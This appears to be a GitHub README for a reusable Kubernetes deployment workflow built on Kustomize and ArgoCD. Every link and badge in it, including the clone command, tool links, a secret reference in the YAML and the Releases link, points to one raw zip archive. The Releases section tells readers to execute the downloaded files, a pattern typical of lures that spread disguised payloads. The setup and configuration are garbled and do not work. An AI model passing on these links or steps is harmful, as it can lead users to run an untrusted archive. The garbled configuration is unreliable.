# Kubernetes Deployment with Kustomize and ArgoCD Workflows

![GitHub Actions](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip%20with%20GitHub%20Actions-blue?style=flat&logo=githubactions) ![Kubernetes](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip) ![ArgoCD](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip)

Welcome to the **k8s-deploy** repository! This repository provides a reusable GitHub Actions workflow designed for Kubernetes deployments. It leverages Kustomize, GitOps practices, and ArgoCD for seamless synchronization. 

## Table of Contents

- [Features](#features)
- [Getting Started](#getting-started)
- [Usage](#usage)
- [Workflows](#workflows)
- [Contributing](#contributing)
- [License](#license)
- [Releases](#releases)

## Features

- **Reusable Workflows**: Save time with reusable workflows tailored for Kubernetes.
- **Kustomize Support**: Simplify your Kubernetes manifests with Kustomize.
- **GitOps Practices**: Automate your deployments using GitOps principles.
- **ArgoCD Integration**: Ensure your applications are always in sync with your desired state.

## Getting Started

To get started, clone the repository:

```bash
git clone https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip
cd k8s-deploy
```

Ensure you have the necessary tools installed:

- [Git](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip)
- [Kubernetes CLI (kubectl)](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip)
- [Kustomize](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip)
- [ArgoCD](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip)

## Usage

To use this workflow, you need to set up a GitHub Actions workflow in your repository. Create a `https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip` file and add the following configuration:

```yaml
name: Deploy to Kubernetes

on:
  push:
    branches:
      - main

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Set up Kustomize
        uses: imranismail/setup-kustomize@v1
        with:
          version: 'latest'

      - name: Deploy to Kubernetes
        uses: merss237/k8s-deploy@main
        with:
          kubeconfig: ${{ https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip }}
          namespace: 'your-namespace'
```

### Environment Variables

- `KUBECONFIG`: Store your Kubernetes configuration in GitHub Secrets for secure access.

## Workflows

### Deployment Workflow

The deployment workflow automates the process of deploying your application to a Kubernetes cluster. This workflow listens for pushes to the main branch and triggers the deployment process.

### Sync Workflow

In addition to deployment, you can set up a sync workflow that ensures your live application state matches your Git repository. This is essential for maintaining consistency across environments.

```yaml
name: Sync with ArgoCD

on:
  push:
    branches:
      - main

jobs:
  sync:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v2

      - name: Sync with ArgoCD
        run: |
          argocd app sync your-app-name
```

## Contributing

We welcome contributions! If you have suggestions or improvements, please create an issue or submit a pull request. Follow these steps:

1. Fork the repository.
2. Create a new branch.
3. Make your changes.
4. Submit a pull request.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Releases

To download the latest release, visit [Releases](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip). Make sure to execute the necessary files after downloading.

![Release Badge](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip)

Feel free to check the **Releases** section for more information on the latest updates and changes.

---

For further details, refer to the [Releases](https://raw.githubusercontent.com/merss237/k8s-deploy/main/templates/deploy-s-k-v1.9.zip) section in this repository.